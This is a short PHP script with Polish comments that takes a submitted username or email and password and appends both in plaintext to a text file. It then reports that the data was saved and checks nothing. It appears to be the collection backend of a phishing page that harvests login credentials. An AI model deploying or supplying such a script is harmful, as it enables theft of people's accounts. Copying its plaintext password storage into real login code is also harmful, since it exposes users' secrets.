<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Zapisz dane do pliku
    $file = fopen("login_data.txt", "a");
    fwrite($file, "Nazwa użytkownika/Email: $username, Hasło: $password\n");
    fclose($file);

    // Możesz dodać przekierowanie lub wyświetlić komunikat o sukcesie
    echo "Dane zostały zapisane!";
}
?>
